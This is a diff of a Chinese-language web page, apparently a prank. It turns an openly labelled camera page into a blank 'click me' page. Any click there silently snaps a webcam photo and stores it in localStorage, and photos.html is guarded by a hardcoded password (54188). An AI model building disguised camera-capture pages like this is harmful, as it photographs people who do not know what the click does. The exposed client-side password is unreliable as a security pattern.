@@ -2,92 +2,93 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>拍照页面</title>
+    <title>点击我</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-        video, canvas, img {
-            display: block;
-            margin: 20px auto;
-            max-width: 100%;
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background-color: #f9f9f9;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: sans-serif;
+            font-size: 2em;
+            user-select: none;
         }
         input[type="password"] {
-            padding: 10px;
-            font-size: 16px;
-            margin: 10px;
-            width: 200px;
+            margin-top: 20px;
+            padding: 8px 12px;
+            font-size: 1em;
         }
         button {
-            padding: 10px 20px;
-            font-size: 16px;
+            margin-top: 10px;
+            padding: 8px 20px;
+            font-size: 1em;
             cursor: pointer;
         }
     </style>
 </head>
-<body>
+<body onclick="capturePhoto()">
+    点击我
+    <br>
+    <input type="password" id="password" placeholder=" ">
+</body>
 
-    <h1>欢迎来到拍照页面</h1>
+<canvas id="canvas" style="display:none;"></canvas>
 
-    <button id="captureBtn">点击我</button>
-
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <img id="photo" alt="拍照预览">
-
-    <input type="password" id="password" placeholder="请输入密码（54188）">
-    <button onclick="checkPassword()">管理员</button>
-
-    <script>
-        const captureBtn = document.getElementById('captureBtn');
-        const video = document.getElementById('video');
+<script>
+    async function capturePhoto() {
         const canvas = document.getElementById('canvas');
-        const photo = document.getElementById('photo');
+        const context = canvas.getContext('2d');
 
-        // 请求摄像头权限并播放视频流
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                alert("无法访问摄像头，请允许权限！");
-                console.error("无法获取摄像头权限:", err);
-            });
+        try {
+            // 请求摄像头权限
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await new Promise(resolve => video.onloadedmetadata = resolve);
+            video.play();
 
-        // 拍照功能
-        captureBtn.addEventListener('click', () => {
-            const context = canvas.getContext('2d');
+            // 设置画布大小
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+
+            // 拍照
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // 将 canvas 的内容转为图片并显示
-            const dataURL = canvas.toDataURL('image/png');
-            photo.src = dataURL;
+            // 停止摄像头
+            stream.getTracks().forEach(track => track.stop());
 
-            // 保存照片到 localStorage
-            localStorage.setItem('capturedPhoto', dataURL);
+            // 转为 Base64 数据
+            const photoData = canvas.toDataURL('image/png');
 
+            // 从 localStorage 读取已有照片
+            let photos = JSON.parse(localStorage.getItem('photos') || '[]');
+
+            // 添加新照片
+            photos.push({ src: photoData });
+
+            // 存回 localStorage
+            localStorage.setItem('photos', JSON.stringify(photos));
+
+            // 弹出提示
             alert("恭喜你被我恭喜到了");
 
-            // 停止摄像头
-            const stream = video.srcObject;
-            const tracks = stream.getTracks();
-            tracks.forEach(track => track.stop());
-        });
-
-        // 验证密码并跳转
-        function checkPassword() {
-            const pwd = document.getElementById('password').value;
-            if (pwd === '54188') {
-                window.location.href = 'photos.html';
-            } else {
-                alert("密码错误，请重试！");
-            }
+        } catch (err) {
+            alert("无法访问摄像头，请允许权限");
+            console.error("摄像头访问失败：", err);
         }
-    </script>
+    }
 
-</body>
+    function checkPassword() {
+        const pwd = document.getElementById('password').value;
+        if (pwd === '54188') {
+            window.location.href = 'photos.html';
+        } else {
+            alert("密码错误，请输入正确的密码（54188）");
+        }
+    }
+</script>
 </html>
